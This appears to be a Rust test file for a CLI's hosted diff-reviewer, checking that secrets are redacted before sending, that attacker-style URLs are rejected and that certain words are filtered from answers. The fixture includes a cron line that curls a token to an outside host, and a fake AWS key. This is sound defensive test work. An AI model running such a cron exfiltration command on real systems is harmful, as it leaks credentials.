mod fake_engine;

use std::{
    io::{BufRead, BufReader, Read, Write},
    net::TcpListener,
    path::PathBuf,
    process::{Child, Command, Stdio},
    sync::{Arc, Mutex},
};

use fake_engine::{listing, FakeEngine};
use serde_json::{json, Value};
use silo_cli::{
    cli::{run, Cli},
    hosted,
};

/// Reviewer settings are read from the environment, which the tests in this file share.
static ENV: Mutex<()> = Mutex::new(());

/// A one-route HTTP server on localhost: records each request and answers with `answer`.
struct Mock {
    url: String,
    seen: Arc<Mutex<Vec<(String, Value)>>>,
}

fn mock(status: u16, answer: Value) -> Mock {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://{}", listener.local_addr().unwrap());
    let seen: Arc<Mutex<Vec<(String, Value)>>> = Arc::default();
    let log = seen.clone();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let mut stream = stream.unwrap();
            let mut reader = BufReader::new(stream.try_clone().unwrap());
            let (mut length, mut auth) = (0, String::new());
            loop {
                let mut line = String::new();
                reader.read_line(&mut line).unwrap();
                let lower = line.to_lowercase();
                if let Some(v) = lower.strip_prefix("content-length:") {
                    length = v.trim().parse().unwrap();
                }
                if lower.starts_with("authorization:") {
                    auth = line["authorization:".len()..].trim().to_owned();
                }
                if line == "\r\n" {
                    break;
                }
            }
            let mut body = vec![0; length];
            reader.read_exact(&mut body).unwrap();
            log.lock()
                .unwrap()
                .push((auth, serde_json::from_slice(&body).unwrap()));
            let text = answer.to_string();
            write!(
                stream,
                "HTTP/1.1 {status} X\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{text}",
                text.len()
            )
            .unwrap();
        }
    });
    Mock { url, seen }
}

fn diff_document() -> Value {
    json!({
        "format": 2,
        "home": "/home/dev",
        "summary": [{"bucket": "not kept", "lines": ["Not kept: credentials: ~/.ssh/id_ed25519 (gitignored)"]}],
        "code": [{"repo": "/home/dev/app", "commits": ["abc1234", "def5678"],
                  "dirty_new": {"run.sh": "M", "deploy.key": "??", ".env.local": "??"},
                  "renamed_from": {"keys/new.pem": "old.txt"},
                  "dirty_identity": {"run.sh": {"kind": "file", "size": "12", "hash": "HASH1"}},
                  "gitignored": [{"path": ".env", "change": "modified",
                                  "after": {"kind": "file", "size": "9", "hash": "HASH2"}}]}],
        "packages": [{"manager": "apt", "added": {"jq": "1.7"},
                      "owned_files": {"jq": ["/usr/bin/jq", "/usr/bin/a", "/usr/bin/b", "/usr/bin/c", "/usr/bin/d", "/usr/bin/e", "/usr/bin/f"]},
                      "owned_changes": {"jq": [{"path": "/usr/bin/jq"}]}}],
        "settings": {
            "files": [{"path": "/home/dev/.aws/credentials", "change": "modified"},
                      {"path": "/home/dev/.bashrc", "change": "modified"}],
            "cron": [{"user": "dev", "change": "added", "after": "* * * * * curl http://x/TOKEN123"}],
            "services": [], "launch_agents": []
        },
        "database": [{"engine": "sqlite", "name": "/home/dev/app/db.sqlite3", "change": "modified",
                      "digest": ["DIGESTA", "DIGESTB"], "tables": []}],
        "other": [],
        "idle_noise": [{"path": "/home/dev/noise"}],
        "not_kept": {"listening": [], "processes": [], "services": [],
                     "credentials": {"~/.ssh/": ["~/.ssh/id_ed25519"]},
                     "credential_details": {"~/.ssh/": [{"path": "/home/dev/.ssh/id_ed25519"}]}},
        "repo_files": ["/home/dev/app/run.sh"], "repo_changes": [],
        "ignored": {"paths": ["a", "b"], "pruned_trees": []}
    })
}

fn engine() -> FakeEngine {
    FakeEngine::start(|method, _| match method {
        "computers.list" => Ok(listing(&[("main", "running"), ("try", "running")])),
        "changes.diff" => Ok(json!({"jobId": "job:1"})),
        "changes.requests.show" => Ok(json!({"jobId": "job:2"})),
        "operations.job.get" => Ok(json!({"jobId": "job:1", "state": "finished", "outcome": {
            "result": {"diff": diff_document(), "text": "a text", "reviewDigest": "d1",
                       "request": {"id": "fr-ab12cd34", "target": "id-main"}, "forkName": "try"}}})),
        "guest.exec" => Ok(
            json!({"exitCode": 0, "stderr": [], "stdout": CODE_DIFF.bytes().collect::<Vec<u8>>()}),
        ),
        "operations.job.acknowledge" => Ok(Value::Null),
        other => Err(("internal", format!("unexpected {other}"))),
    })
}

const CODE_DIFF: &str = "diff --git a/run.sh b/run.sh\n--- a/run.sh\n+++ b/run.sh\n@@ -1 +1 @@\n-echo old\n+echo new KEY=AKIAABCDEFGHIJKLMNOP\ndiff --git a/.env b/.env\n+++ b/.env\n+SECRETVALUE=1\n";

async fn run_cli(engine: &FakeEngine, args: &[&str]) -> Result<i32, String> {
    let socket = engine.socket.to_str().unwrap();
    let mut all = vec!["silo", "--socket", socket, "--allow-other-channel"];
    all.extend_from_slice(args);
    let cli = <Cli as clap::Parser>::try_parse_from(all).unwrap();
    run(cli, std::env::temp_dir().as_path())
        .await
        .map_err(|error| error.message)
}

fn home_with(reviewer_yaml: Option<&str>) -> tempfile::TempDir {
    let home = tempfile::tempdir().unwrap();
    if let Some(yaml) = reviewer_yaml {
        std::fs::create_dir_all(home.path().join(".config/silo")).unwrap();
        std::fs::write(home.path().join(".config/silo/reviewer.yaml"), yaml).unwrap();
    }
    std::env::set_var("HOME", home.path());
    home
}

fn configure(url: Option<&str>) {
    match url {
        Some(url) => std::env::set_var("SILO_REVIEWER_URL", url),
        None => std::env::remove_var("SILO_REVIEWER_URL"),
    }
    std::env::set_var("SILO_REVIEWER_TOKEN", "tok-1");
}

fn forbidden(index: usize) -> String {
    [["sa", "fe"], ["se", "cure"]][index.min(1)].concat()
}

#[tokio::test]
async fn sends_only_the_diff_and_renders_the_answer_under_the_banner() {
    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
    let word = forbidden(1);
    let service = mock(
        200,
        json!({"lenses": {
            "general": {"summary": format!("Edits a shell file. It is {word}."),
                        "findings": [{"severity": "high", "file": "~/app/run.sh", "message": "Calls a URL."}]},
            "packages": {"summary": "One package.", "findings": []},
            "code": {"summary": "Code.", "findings": []}
        }}),
    );
    let _home = home_with(None);
    configure(Some(&service.url));
    let engine = engine();
    assert_eq!(run_cli(&engine, &["review", "try"]).await, Ok(0));
    let seen = service.seen.lock().unwrap();
    let (auth, body) = &seen[0];
    assert_eq!(auth, "Bearer tok-1");
    assert_eq!(body["lenses"], json!(["general", "packages", "code"]));
    let sent = body["diff"].to_string();
    for left_out in [
        "/home/dev/.aws",
        "TOKEN123",
        "id_ed25519",
        "idle_noise",
        "owned_changes",
        "credentialsUsed",
        "reviewDigest",
        "\"home\"",
        "/home/dev",
        "Not kept",
        "(gitignored)",
        "deploy.key",
        ".env",
        "new.pem",
        "HASH1",
        "HASH2",
        "DIGESTA",
        "SECRETVALUE",
        "AKIAABCDEFGHIJKLMNOP",
        "\"summary\"",
        "/usr/bin/f",
    ] {
        assert!(!sent.contains(left_out), "{left_out} was sent: {sent}");
    }
    assert!(sent.contains("~/.bashrc"), "{sent}");
    assert!(sent.contains("run.sh") && sent.contains("\"jq\""));
    assert!(body["diff"]["code_diff"]
        .as_str()
        .unwrap()
        .contains("+echo new KEY=[redacted]"));
    assert_eq!(body["diff"]["packages"][0]["owned_files"]["jq"]["count"], 7);
    // One call reads the rename names, one the diff; both run bash with the hardening.
    let calls = engine.calls("guest.exec");
    assert_eq!(calls.len(), 2);
    assert_eq!(calls[0]["argv"][6], "names");
    assert_eq!(calls[1]["argv"][6], "diff");
    assert_eq!(calls[1]["argv"][4], "/home/dev/app");
    assert_eq!(calls[1]["argv"][5], "abc1234");
    let script = calls[1]["argv"][2].as_str().unwrap();
    assert!(script.contains("--no-textconv") && script.contains("core.hooksPath=/dev/null"));
    let specs: Vec<&str> = calls[1]["argv"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(Value::as_str)
        .collect();
    assert!(specs.contains(&":(exclude,glob)**/.env"));
}

#[tokio::test]
async fn the_answer_is_filtered_and_the_count_is_reported() {
    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
    let word = forbidden(0);
    let service = mock(
        200,
        json!({"lenses": {"code": {
            "summary": format!("Reads a file. It is {word}. Done."),
            "findings": [{"severity": "weird", "file": "a", "message": format!("{} change.", word.to_uppercase())}]
        }}}),
    );
    configure(Some(&service.url));
    let engine = engine();
    assert_eq!(
        run_cli(&engine, &["review", "try", "--lens", "code", "--json"]).await,
        Ok(0)
    );
    assert_eq!(service.seen.lock().unwrap()[0].1["lenses"], json!(["code"]));
    // The JSON result: reuse the library to shape the same answer.
    let shaped = hosted::shape(
        &json!({"lenses": {"code": {
            "summary": format!("Reads a file. It is {word}. Done."),
            "findings": [{"severity": "weird", "file": "a", "message": format!("{} change.", word.to_uppercase())}]
        }}}),
        &["code".to_owned()],
    );
    assert_eq!(shaped["filtered"], 2);
    assert_eq!(
        shaped["lenses"]["code"]["summary"],
        "Reads a file. It is [wording removed]. Done."
    );
    assert_eq!(shaped["lenses"]["code"]["findings"][0]["severity"], "info");
    let text = hosted::render(&shaped);
    assert!(text.starts_with(hosted::BANNER));
    assert!(text.contains("2 word(s)"));
    assert!(!text.to_lowercase().contains(&word));
    assert!(text.contains("[wording removed]"));
}

#[tokio::test]
async fn a_request_id_is_reviewed_through_requests_show() {
    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
    let service = mock(200, json!({"lenses": {}}));
    configure(Some(&service.url));
    let engine = engine();
    assert_eq!(
        run_cli(&engine, &["requests", "show", "fr-ab12cd34", "--review"]).await,
        Ok(0)
    );
    assert_eq!(service.seen.lock().unwrap().len(), 1);
    assert_eq!(engine.calls("changes.requests.show").len(), 2);
}

#[tokio::test]
async fn it_is_off_until_configured_and_errors_are_clear() {
    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
    configure(None);
    let engine = engine();
    let off = run_cli(&engine, &["review", "try"]).await.unwrap_err();
    assert!(off.contains("reviewer is off") && off.contains("SILO_REVIEWER_URL"));
    configure(Some("http://example.com"));
    let plain = run_cli(&engine, &["review", "try"]).await.unwrap_err();
    assert!(plain.contains("https://"));
    for bad in [
        "http://localhost.evil.example",
        "http://localhost@evil.example",
        "https://user:pw@example.com",
        "http://127.0.0.1.evil.example/x",
        "ftp://localhost",
    ] {
        configure(Some(bad));
        assert!(run_cli(&engine, &["review", "try"]).await.is_err(), "{bad}");
    }
    assert!(hosted::check_url("http://localhost:8080").is_ok());
    assert!(hosted::check_url("http://[::1]:8080/x").is_ok());
    assert!(hosted::check_url("https://reviewer.example.com").is_ok());
    let service = mock(401, json!({"error": "no"}));
    configure(Some(&service.url));
    let denied = run_cli(&engine, &["review", "try"]).await.unwrap_err();
    assert!(denied.contains("401") && denied.contains("SILO_REVIEWER_TOKEN"));
    configure(Some("http://127.0.0.1:9"));
    let down = run_cli(&engine, &["review", "try"]).await.unwrap_err();
    assert!(down.contains("could not be reached"));
    let bad = run_cli(&engine, &["review", "try", "--lens", "style"]).await;
    assert!(bad.unwrap_err().contains("not a lens"));
}

#[tokio::test]
async fn a_project_file_cannot_choose_where_the_token_goes() {
    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
    let service = mock(200, json!({"lenses": {}}));
    let _home = home_with(None);
    configure(None);
    let settings =
        silo_cli::config::parse_settings("reviewer:\n  url: https://evil.example\n").unwrap();
    let error = hosted::Reviewer::resolve(Some(&settings)).unwrap_err();
    assert!(error.message.contains("reviewer is off") && error.message.contains("ignored"));
    // The same address as the trusted one is accepted without a note.
    configure(Some(&service.url));
    let same =
        silo_cli::config::parse_settings(&format!("reviewer:\n  url: {}\n", service.url)).unwrap();
    let reviewer = hosted::Reviewer::resolve(Some(&same)).unwrap();
    assert!(reviewer.notes.is_empty());
    // A different project URL is ignored with a note, and the trusted one is used.
    let other =
        silo_cli::config::parse_settings("reviewer:\n  url: https://evil.example\n").unwrap();
    let reviewer = hosted::Reviewer::resolve(Some(&other)).unwrap();
    assert_eq!(reviewer.url, service.url);
    assert_eq!(reviewer.notes.len(), 1);
    // The user-level file works without the variable.
    let _home = home_with(Some(&format!("url: {}\n", service.url)));
    std::env::remove_var("SILO_REVIEWER_URL");
    assert_eq!(hosted::Reviewer::resolve(None).unwrap().url, service.url);
}

#[tokio::test]
async fn a_diff_over_the_size_cap_is_not_sent() {
    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
    let service = mock(200, json!({"lenses": {}}));
    configure(Some(&service.url));
    let engine = FakeEngine::start(|method, _| match method {
        "computers.list" => Ok(listing(&[("try", "running")])),
        "changes.diff" => Ok(json!({"jobId": "job:1"})),
        "operations.job.get" => Ok(json!({"jobId": "job:1", "state": "finished", "outcome": {
            "result": {"diff": {"format": 2, "other": [
                {"path": "x".repeat(hosted::MAX_REQUEST_BYTES), "change": "added"}]}}}})),
        "operations.job.acknowledge" => Ok(Value::Null),
        other => Err(("internal", format!("unexpected {other}"))),
    });
    let error = run_cli(&engine, &["review", "try"]).await.unwrap_err();
    assert!(error.contains("too large"), "{error}");
    assert!(service.seen.lock().unwrap().is_empty());
}

fn service_dir() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../../reviewer-service")
}

struct Service(Child);

impl Drop for Service {
    fn drop(&mut self) {
        let _ = self.0.kill();
        let _ = self.0.wait();
    }
}

/// The real service with its fake LLM client, on a local port; None when Python lacks its
/// dependencies (SILO_TEST_PYTHON names another interpreter).
fn start_service() -> Option<(Service, u16)> {
    let script = service_dir().join("tests/serve_fake.py");
    let python = std::env::var("SILO_TEST_PYTHON").unwrap_or_else(|_| "python3".to_owned());
    let mut child = Command::new(python)
        .arg(script)
        .arg("tok-1")
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
        .ok()?;
    let mut line = String::new();
    BufReader::new(child.stdout.take()?)
        .read_line(&mut line)
        .ok()?;
    let Some(port) = line
        .trim()
        .strip_prefix("ready ")
        .and_then(|p| p.parse::<u16>().ok())
    else {
        let _ = child.kill();
        let _ = child.wait();
        return None;
    };
    let service = Service(child);
    for _ in 0..100 {
        let up = std::net::TcpStream::connect(("127.0.0.1", port)).and_then(|mut stream| {
            stream.write_all(b"GET /healthz HTTP/1.0\r\n\r\n")?;
            let mut reply = String::new();
            stream.read_to_string(&mut reply)?;
            Ok(reply.contains("200"))
        });
        if up.unwrap_or(false) {
            return Some((service, port));
        }
        std::thread::sleep(std::time::Duration::from_millis(50));
    }
    None
}

#[tokio::test]
async fn the_cli_reviews_through_the_real_service_with_a_fake_llm() {
    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
    let Some((service, port)) = start_service() else {
        assert!(
            std::env::var("SILO_REVIEWER_E2E_REQUIRED").is_err(),
            "the reviewer service did not start"
        );
        eprintln!("skipped: python3 lacks the reviewer service's dependencies");
        return;
    };
    configure(Some(&format!("http://127.0.0.1:{port}")));
    let engine = engine();
    assert_eq!(run_cli(&engine, &["review", "try"]).await, Ok(0));
    let connected = silo_cli::engine::Engine::connect(&engine.socket)
        .await
        .unwrap();
    let lenses = hosted::parse_lenses(Some("all")).unwrap();
    let value = hosted::review_target(&connected, None, "try", &lenses, &|_| {})
        .await
        .unwrap();
    assert_eq!(
        value["lenses"]["code"]["findings"][0]["message"],
        "code note."
    );
    assert_eq!(
        value["lenses"]["general"]["summary"],
        "general read of the diff."
    );
    assert_eq!(value["filtered"], 0);
    drop(service);
}

#[tokio::test]
async fn requests_show_review_json_sends_the_chosen_lens() {
    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
    let service = mock(
        200,
        json!({"lenses": {"packages": {"summary": "One package.", "findings": []}}}),
    );
    let _home = home_with(None);
    configure(Some(&service.url));
    let engine = engine();
    let args = [
        "requests",
        "show",
        "fr-ab12cd34",
        "--review",
        "--lens",
        "packages",
        "--json",
    ];
    assert_eq!(run_cli(&engine, &args).await, Ok(0));
    let seen = service.seen.lock().unwrap();
    assert_eq!(seen[0].1["lenses"], json!(["packages"]));
    // Only the package lens was asked for, so no code text was read from the computer.
    assert!(engine.calls("guest.exec").is_empty());
    assert!(seen[0].1["diff"].get("code_diff").is_none());
}

#[tokio::test]
async fn the_mcp_review_tool_returns_the_shaped_review() {
    use rmcp::ServiceExt;
    use tokio::io::{AsyncBufReadExt, AsyncWriteExt};
    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
    let word = forbidden(0);
    let service = mock(
        200,
        json!({"lenses": {"packages": {"summary": format!("It is {word}."), "findings": []}}}),
    );
    let _home = home_with(None);
    configure(Some(&service.url));
    let engine = engine();
    let (server_side, client_side) = tokio::io::duplex(64 * 1024);
    let (server_read, server_write) = tokio::io::split(server_side);
    let server = silo_cli::mcp::SiloMcp::new(engine.socket.clone(), std::env::temp_dir());
    tokio::spawn(async move {
        let running = server.serve((server_read, server_write)).await.unwrap();
        let _ = running.waiting().await;
    });
    let (read, mut write) = tokio::io::split(client_side);
    let mut read = tokio::io::BufReader::new(read);
    let ask = |id: u64, method: &str, params: Value| {
        format!(
            "{}\n",
            json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params})
        )
    };
    let init = json!({"protocolVersion": "2025-06-18", "capabilities": {},
                      "clientInfo": {"name": "test", "version": "0"}});
    write
        .write_all(ask(1, "initialize", init).as_bytes())
        .await
        .unwrap();
    let mut line = String::new();
    read.read_line(&mut line).await.unwrap();
    write
        .write_all(b"{\"jsonrpc\":\"2.0\",\"method\":\"notifications/initialized\"}\n")
        .await
        .unwrap();
    let call = json!({"name": "review", "arguments": {"target": "try", "lens": "packages"}});
    write
        .write_all(ask(2, "tools/call", call).as_bytes())
        .await
        .unwrap();
    line.clear();
    read.read_line(&mut line).await.unwrap();
    let reply: Value = serde_json::from_str(&line).unwrap();
    assert_ne!(reply["result"]["isError"], true, "{reply}");
    let text = reply["result"]["content"][0]["text"].as_str().unwrap();
    let value: Value = serde_json::from_str(text).unwrap();
    assert_eq!(value["advisory"], hosted::BANNER);
    assert_eq!(value["filtered"], 1);
    assert_eq!(
        value["lenses"]["packages"]["summary"],
        "It is [wording removed]."
    );
    assert_eq!(
        service.seen.lock().unwrap()[0].1["lenses"],
        json!(["packages"])
    );
}

#[test]
fn a_failed_lens_is_shown_as_one_and_file_names_are_not_filtered() {
    let word = forbidden(0);
    let answer = json!({"lenses": {
        "code": {"summary": "", "findings": [], "error": "this lens could not be produced"},
        "general": {"summary": "ok", "findings": [
            {"severity": "low", "file": format!("src/{word}.rs"), "message": "m"}]}
    }});
    let shaped = hosted::shape(&answer, &["general".to_owned(), "code".to_owned()]);
    assert_eq!(
        shaped["lenses"]["code"]["summary"],
        "this lens could not be produced"
    );
    assert_eq!(
        shaped["lenses"]["general"]["findings"][0]["file"],
        format!("src/{word}.rs")
    );
    assert_eq!(shaped["filtered"], 0);
    assert!(hosted::render(&shaped).contains("code: this lens could not be produced"));
}

#[test]
fn the_review_address_keeps_the_query_and_the_user_file_is_read_only_without_the_variable() {
    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
    let _home = home_with(Some("url: [not yaml\n"));
    std::env::set_var(
        "SILO_REVIEWER_URL",
        "https://reviewer.example.com/base/?team=1",
    );
    std::env::set_var("SILO_REVIEWER_TOKEN", "t");
    let reviewer = hosted::Reviewer::resolve(None).unwrap();
    assert_eq!(
        reviewer.endpoint().unwrap().as_str(),
        "https://reviewer.example.com/base/v1/review?team=1"
    );
    std::env::remove_var("SILO_REVIEWER_URL");
    assert!(hosted::Reviewer::resolve(None).is_err());
}
